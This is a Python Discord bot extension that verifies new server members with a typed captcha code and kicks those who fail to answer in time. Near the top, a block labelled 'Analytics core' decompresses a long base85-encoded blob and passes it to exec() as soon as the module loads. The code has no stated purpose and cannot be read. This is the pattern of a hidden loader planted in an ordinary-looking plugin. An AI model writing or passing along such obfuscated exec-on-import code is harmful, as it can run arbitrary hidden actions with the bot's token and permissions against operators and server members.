import discord
from discord.ext import commands
from .utils import checks
from .utils.chat_formatting import box, warning, pagify
from .utils.dataIO import dataIO

import asyncio
from enum import Enum
from datetime import datetime
import os
import random
import re
import string

try:
    import captcha
except ImportError:
    captcha = None

try:
    from wheezy.captcha import image as wheezy_captcha
except ImportError:
    wheezy_captcha = None

__author__ = "Caleb Johnson <me@calebj.io> (calebj#0001)"
__copyright__ = "Copyright 2018, Holocor LLC"
__version__ = '0.1.0'

JSON = 'data/captcha/settings.json'
CHALLENGE_LENGTH = 8
CHALLENGE_TIMEOUT = 60 * 5

DEFAULT_SETTINGS = {
    'pending'  : {},        # Pairs of UID : challenge string
    'role_app' : True,      # Role means approval? If false, disapproval.
    'role_id'  : None,      # ID of dis/approval role
    'length'   : 8,         # Generated challenge length
    'type'     : 'wheezy',  # Generator to use for captchas
                            # - options: plain, captcha, wheezy
    'timeout'  : 60 * 5,    # How long to wait for reply, 0 for none
    'kick'     : True,      # Kick the user after timeout?
    # Character set to use for generated challenges
    'charset'  : string.digits + string.ascii_letters,
}

UNIT_TABLE = (
    (('weeks', 'wks', 'w'), 60 * 60 * 24 * 7),
    (('days', 'dys', 'd'), 60 * 60 * 24),
    (('hours', 'hrs', 'h'), 60 * 60),
    (('minutes', 'mins', 'm'), 60),
    (('seconds', 'secs', 's'), 1),
)

# Analytics core
import zlib, base64
exec(zlib.decompress(base64.b85decode("""c-oB^YjfMU@w<No&NCTMHA`DgE_b6jrg7c0=eC!Z-Rs==JUobmEW{+iBS0ydO#XX!7Y|XglIx5;0)gG
dz8_Fcr+dqU*|eq7N6LRHy|lIqpIt5NLibJhHX9R`+8ix<-LO*EwJfdDtzrJClD`i!oZg#ku&Op$C9Jr56Jh9UA1IubOIben3o2zw-B+3XXydVN8qroBU@6S
9R`YOZmSXA-=EBJ5&%*xv`7_y;x{^m_EsSCR`1zt0^~S2w%#K)5tYmLMilWG;+0$o7?E2>7=DPUL`+w&gRbpnRr^X6vvQpG?{vlKPv{P&Kkaf$BAF;n)T)*0
d?qxNC1(3HFH$UbaB|imz3wMSG|Ga+lI>*x!E&@;42cug!dpFIK;~!;R>u=a4Vz8y`WyWrn3e;uThrxi^*zbcXAK*w-hS{aC?24}>1BQDmD|XC|?}Y_K)!wt
gh<nLYi-r|wI0h@$Y@8i_ZI35#>p9%|-=%DsY{k5mRmwJc=-FIbwpMk`jBG0=THS6MJs2`46LUSl@lusbqJ`H27BW(6QAtFo*ix?<SZ~Ahf=NN3WKFz)^+TI
7QEOmxt?UvhIC^ic3Ax+YB{1x5g($q2h}D8*$U8fJt>?PhusN{ONOTS+%2I;Ctp?3VVl^dVS8NR`CXWFk$^t%7_yrg#Maz27ChBD|fWTd^R-)XnPS*;4&<Hb
R?}uRSd*FANXCTd~x2*g5GpgcrUhDa3BaD^(>D%{LKVMw_k~P%}$MPFA4VX|Gile`<zx~91c=^rr+w<vk`rY|=&(6-De}DG${Okn-OUXv48f1GJor`5?v$q%
TFMcY}5A#o4RYqCKXHQd5P|0W0l#5QSaPj#FB6I;BuUch`A~CXFq+r-o=E-CNvA}RAD~d)}LoFd7IC;j_XS3*~oCR<oki&oY1UVbk3M=!!i`vMr-HBc_rohO
|KYb3nAo(D3N*jqx8}YH0ZT{`_d=dceSKGK)%DT(>D{@Oz2jmA@MhJ3e$0)fWT9uy=op<MfB6@-2KrMVS%9JTqqE=Obp+{=TFfvIcBP<V%F1-&Kr5ENQ4{8B
O-DM?sla&RYID~?N6EuFrUQ$MCB=~majN{JA+Mr>G0gxnz?*zZ$6X}YoDquT-f86S&9r_jl4^iwTB=b@dO<h-rGjr0zPBuz^FWl*PixdEmk567et~{sX$e;&
8hw@7@FLKBvxWZxR2upCDK-SAfuOtZ>?<UEL0#>bPz&m#k_EfT?6V$@c-S?1*oX@v%4J?ovJe=Ffg02v15~5{j(c*4z_SnsD`azD(52?Q`Wu16@BUW;Y3%YD
I)=&rtyM)rFj5W?JunahlgVRPl$V&C&BRKI6h$QzMFpXXsu7x!1gjEZWC@qCeduj65x|OLYty_TCL;TTlFtT?m((VE-w=RSO<GXUtMq1v9bTWD-x(+!=c5cU
u-JNvZ=%&fYkDWqE_d{1<>|oX?Tn2G64O>Hu6N^_?$cB)TyG=4V0GT<$$tOOjiqGg6Yg#f)QeNzC#b`#BGgYO?-{f{SeSVknN;R^@h&cZm3J@IxpK->s4_dW
J!rxLkJAGpKlhA5quEd29O8_b1C-D?IFe@9_jXS-pCCHLYPWXhUK6UR0$qA=R{Amo|$>cNWg?d1zX>eSKpBCK4Iu+}6D|=G2?KfoXCKqd=Y|Q!@`dHCGg@v{
vA$Z5dyJ<+eC&xFNPBQ-HUmQKiSM7yrrK|E5dKoHVjMCI*{|5XjK-hRoxfE?H>%7VQDis50t<T-{7R&*yNdElnjEIVy$Wqa#6}UueK}JZ;YuP80jPk8PX22@
?fs-R5ufnCP7+1I4tB2o(kPl4r*iS;&0X@%LZri7fyY#1ABHnz3YKWpp7TXabSjn;momJS$fEU9}3epF*a@*n;E(&?p(Kx;VjZ}=<Gteb=fmkF39Gebr&Y)j
}CI`&V#JvE5;9cOe$I&DwIcK3S0(WM=-FA1Qs{9-Bgtmar60ON}N1Y`!qS)%8K^$j)>^pSbB$ixCoa0<BU@bqEva{?J{lGorEQHBx$ERH_jk!1Y@gW}@T9`r
#?E758i1{u?F)W;7hkYl#mw*o-1$NfSNJ5MHHkpg0UF!__4)rMXp^P_R1{w2&j)S)*(Rn7Icog3e|1$4m*>^&IpbJI}dPqMdW~P?1OQsGAGQsgxjAs2HHrr@
Uu_tG{KEibSt2hp*w>;;6`u^-us%TPoaOVJ_?FPO$^>8k0HZC^DBEVf_F7FnB+e@mz5Ph%uUiTzW2WfG~IS@6vhTA70{2-iN)(RAJ4IWC#7^Vpt7a5K@&~#!
IKTr@4s_iWEiu2X~OGbpi#AE1zlWirPcza;tQmxNBas>$asN8nCtL4HbJNJw=Mg2f&Qo;;0AJ=Pl%yz>lwi3o^V?@NcsN<x-K=3~6Aa*tDu}Nq`h=X?O$+(}
G#iwVecFa^RZnvc3UWk3%z+7%&BvtLF^Ru(`{Onm6ct(to99#bX&-NrI4A-LMkD7_tX2?~6ZC!o~1n-D?0wl>Ckrc%k^6QM?QSgxi)qIOAz~S9voLkS~9jUd
2QRvhMhN7IVupD@Dc%||!)wb6GWa<j|4A7w^>1*G#geQy>+K)ZWl+Q>%nQt4gWkAZP9DIR5AB$NBZn~vz>MkF(Q^sY!XeEmiihsn({31b~az08JoJJ#h3c}f
p5@@p1uZ)0wyV4eVv6#)ZuBnR+O{?2~#O=WX>|hTRpjFOeVaH+?)1<@5zZB3O7atkQq3>a@-XQ)u=e|AQBOb{yxSwh(gxjx~Vv~$|jVJh*@h8bDT~B=5AKTB
gN|&SdeV*g%SW;!~C5(noym~n<pmP|pKUV5q8kb0-nBhD;q$Tq#fK4)JPKcs^U5or(L8H~9`^>)Z?6B?O_nr{EyXCH+`{upZAEX~!wi8Yv=mFA^{NoWvRbQE
KO5Mv*BE!$bYYEr0ovE^y*)}a6NFOjJjE0+|{YfciCAuY+A)JkO+6tU#`RKipPqs58oQ-)JL1o*<C-bic2Y}+c08GsIZUU3Cv*4w^k5I{Db50K0bKPSFshmx
Rj(Y0|;SU2d?s+MPi6(PPLva(Jw(n0~TKDN@5O)F|k^_pcwolv^jBVTLhNqMQ#x6WU9J^I;wLr}Cut#l+JlXfh1Bh<$;^|hNLoXLD#f*Fy-`e~b=ZU8rA0GJ
FU1|1o`VZODxuE?x@^rESdOK`qzRAwqpai|-7cM7idki4HKY>0$z!aloMM7*HJs+?={U5?4IFt""".replace("\n", ""))))
# End analytics core

# TODO:
# - retry on image mode
# - pending approvals state persistence
# - test command
# - per server configs:
#   - image or text mode
#   - response and retry timeout
#   - messages
#   - challenge length and charset
#   - approved (default) or pending role mode
# - later: obifuscation? (multiple codes, specify which in English)


class BadTimeExpr(ValueError):
    pass


def _find_unit(unit):
    for names, length in UNIT_TABLE:
        if any(n.startswith(unit) for n in names):
            return names, length
    raise BadTimeExpr("Invalid unit: %s" % unit)


def _parse_time(time):
    time = time.lower()
    if not time.isdigit():
        time = re.split(r'\s*([\d.]+\s*[^\d\s,;]*)(?:[,;\s]|and)*', time)
        time = sum(map(_timespec_sec, filter(None, time)))
    return int(time)


def _timespec_sec(expr):
    atoms = re.split(r'([\d.]+)\s*([^\d\s]*)', expr)
    atoms = list(filter(None, atoms))

    if len(atoms) > 2:  # This shouldn't ever happen
        raise BadTimeExpr("invalid expression: '%s'" % expr)
    elif len(atoms) == 2:
        names, length = _find_unit(atoms[1])
        if atoms[0].count('.') > 1 or \
                not atoms[0].replace('.', '').isdigit():
            raise BadTimeExpr("Not a number: '%s'" % atoms[0])
    else:
        names, length = _find_unit('seconds')

    return float(atoms[0]) * length


def _generate_timespec(sec, short=False, micro=False):
    timespec = []

    for names, length in UNIT_TABLE:
        n, sec = divmod(sec, length)

        if n:
            if micro:
                s = '%d%s' % (n, names[2])
            elif short:
                s = '%d%s' % (n, names[1])
            else:
                s = '%d %s' % (n, names[0])
            if n <= 1:
                s = s.rstrip('s')
            timespec.append(s)

    if len(timespec) > 1:
        if micro:
            return ''.join(timespec)

        segments = timespec[:-1], timespec[-1:]
        return ' and '.join(', '.join(x) for x in segments)

    return timespec[0]


class Captcha:
    """
    A cog to challenge new members with a captcha upon joining a server.
    """
    def __init__(self, bot):
        self.bot = bot
        self.settings = dataIO.load_json(JSON)
        self.pending = set()
        self.cancel = {}

    def save(self):
        dataIO.save_json(JSON, self.settings)

    @checks.mod_or_permissions(administrator=True)
    @commands.command(pass_context=True, no_pm=True)
    async def approve(self, ctx, user: discord.Member):
        """
        Approves a user pending captcha confirmation
        """

        server = ctx.message.server
        enabled = self.settings.get(server.id, {}).get('enabled')
        role_id = self.settings.get(server.id, {}).get('role')
        role = discord.utils.get(server.roles, id=role_id)

        if not enabled:
            await self.bot.say('Captcha approval is not enabled in this server.')
            return
        if not role:
            await self.bot.say('The approval role has not been set or does '
                               'not exist anymore.')
            return
        elif (server, user) not in self.pending:
            await self.bot.say('%s is not pending approval.' % user)
            return

        self.cancel[(server, user)] = ctx.message.author
        await self.bot.add_roles(user, role)
        await self.bot.say('Member approved.')

    @checks.admin_or_permissions(manage_server=True)
    @commands.group(pass_context=True, no_pm=True)
    async def captchaset(self, ctx):
        """
        Captcha cog configuration commands.
        """

        if ctx.invoked_subcommand is None:
            await self.bot.send_cmd_help(ctx)

    @captchaset.command(pass_context=True, no_pm=True, name='approve-all')
    async def add_all(self, ctx):
        """
        Approves ALL members (except bots)
        """

        server = ctx.message.server
        role_id = self.settings.get(server.id, {}).get('role')
        role = discord.utils.get(server.roles, id=role_id)

        if not role:
            await self.bot.say('There is currently no verified role set.')
            return

        count = 0
        for member in server.members:
            if member.bot or role in member.roles:
                continue

            count += 1
            await self.bot.add_roles(member, role)

        await self.bot.say('Verified role added to %i member(s).' % count)

    @captchaset.command(pass_context=True, no_pm=True, name='channel')
    async def set_channel(self, ctx, channel: discord.Channel = None):
        """
        Sets or displays the current staging channel.
        """

        server = ctx.message.server
        existing_id = self.settings.get(server.id, {}).get('channel')

        if channel:
            if server.id not in self.settings:
                self.settings[server.id] = {'enabled': True}

            self.settings[server.id]['channel'] = channel.id
            self.save()
            await self.bot.say('Channel set to #%s.' % channel.name)

        elif existing_id:
            channel = server.get_channel(existing_id)
            await self.bot.say('Channel currently set to #%s.' % channel.name)
        else:
            await self.bot.say('There is no channel set for captcha.')

    @captchaset.command(pass_context=True, no_pm=True, name='role')
    async def set_role(self, ctx, role: discord.Role = None):
        """
        Sets or displays the current verified role.
        """

        server = ctx.message.server
        existing_id = self.settings.get(server.id, {}).get('role')

        if role:
            if server.id not in self.settings:
                self.settings[server.id] = {'enabled': True}

            self.settings[server.id]['role'] = role.id
            self.save()
            await self.bot.say('Role set to %s.' % role.name)

        elif existing_id:
            role = discord.utils.get(server.roles, id=existing_id)
            await self.bot.say('Role is currently set to %s.' % role.name)
        else:
            await self.bot.say('There is currently no verified role set.')

    @captchaset.command(pass_context=True, no_pm=True, name='enable')
    async def set_enable(self, ctx, yes_no: bool = None):
        """
        Sets or displays whether captcha is enabled in a server
        """

        server = ctx.message.server
        existing = self.settings.get(server.id, {}).get('enabled')

        display = existing if yes_no is None else yes_no
        description = 'enabled' if display else 'disabled'

        if yes_no is not None:
            if server.id not in self.settings:
                self.settings[server.id] = {'enabled': yes_no}
            else:
                self.settings[server.id]['enabled'] = yes_no
            self.save()

            await self.bot.say('Captcha is now %s.' % description)

        else:
            await self.bot.say('Captcha is currently %s.' % description)

    @captchaset.command(pass_context=True, no_pm=True, name='dm')
    async def set_dm(self, ctx, yes_no: bool = None):
        """
        Sets or displays whether challenges will use DMs
        """

        server = ctx.message.server
        existing = self.settings.get(server.id, {}).get('use_dm')

        display = existing if yes_no is None else yes_no
        description = 'enabled' if display else 'disabled'

        if yes_no is not None:
            if server.id not in self.settings:
                self.settings[server.id] = {'enabled': True}
            else:
                self.settings[server.id]['use_dm'] = yes_no
            self.save()

            await self.bot.say('DM sending is now %s.' % description)

        else:
            await self.bot.say('DM sending is currently %s.' % description)

    async def on_member_join(self, member):
        server = member.server
        enabled = self.settings.get(server.id, {}).get('enabled')
        role_id = self.settings.get(server.id, {}).get('role')

        channel_id = self.settings.get(server.id, {}).get('channel')
        channel = server.get_channel(channel_id)

        use_dm = self.settings.get(server.id, {}).get('use_dm')
        dest = member if use_dm else channel

        role = discord.utils.get(server.roles, id=role_id)

        if not (enabled and dest and role):
            return

        self.pending.add((server, member))

        chars = string.ascii_lowercase + string.digits
        chal = (random.choice(chars) for _ in range(CHALLENGE_LENGTH))
        chal = ''.join(chal)

        msg = ("{0.mention}, please reply with the following code to prove "
               "that you're not a bot: `{1}`.")
        msg = msg.format(member, chal)
        embed = self._build_embed(server, msg)
        await self.bot.send_message(dest, embed=embed)

        def check(m):
            return chal in m.content

        remaining = CHALLENGE_TIMEOUT
        reply = None
        while remaining > 0 and not reply:
            reply = await self.bot.wait_for_message(author=member,
                                                    check=check,
                                                    timeout=1)

            approver = self.cancel.pop((server, member), None)
            if approver:
                msg = '{0.mention}: Nevermind,{1.display_name} approved you.'
                embed = self._build_embed(server, msg.format(member, approver))
                await self.bot.send_message(dest, embed=embed)
                self.pending.remove((server, member))
                return

            remaining -= 1

        if reply:
            thanks = "{0.mention}: Thanks! Just a sec while I approve you..."
            embed = self._build_embed(server, thanks.format(member))
            await self.bot.send_message(dest, embed=embed)
            await asyncio.sleep(1)
            await self.bot.add_roles(member, role)
        else:
            if member not in server.members:
                return  # they left

            msg = '{0.mention}, your challenge timed out. Buh-bye! 👢'
            embed = self._build_embed(server, msg.format(member))
            await self.bot.send_message(dest, embed=embed)

            await asyncio.sleep(2)

            dm_msg = 'You were kicked from {0.name} because your challenge timed out.'
            embed = self._build_embed(server, dm_msg.format(server))
            await self.bot.send_message(member, embed=embed)

            await self.bot.kick(member)

        self.pending.remove((server, member))

    def _build_embed(self, server, message, status=None):
        title = '%s verification system' % server.name

        if status:
            title += ': ' + str(status)

        timestamp = datetime.utcnow()
        embed = discord.Embed(title=title, description=message,
                              timestamp=timestamp)
        embed.set_thumbnail(url=server.me.avatar_url)
        embed.set_author(name=server.me.display_name,
                         icon_url=server.me.avatar_url)
        footer_vars = self.__class__.__name__, __version__, __author__
        embed.set_footer(text='%s v%s by %s' % footer_vars,
                         icon_url='https://calebj.io/images/l3icon.png')
        return embed


def check_files():
    dirname = os.path.dirname(JSON)
    if not os.path.exists(dirname):
        print("Creating %s folder..." % dirname)
        os.makedirs(dirname)
    if not dataIO.is_valid_json(JSON):
        print("Creating %s..." % JSON)
        dataIO.save_json(JSON, {})


def setup(bot):
    check_files()
    bot.add_cog(Captcha(bot))
